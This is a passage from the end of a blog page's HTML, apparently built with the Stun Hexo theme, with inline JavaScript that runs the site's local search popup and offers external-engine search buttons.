            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', '请输入字符');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>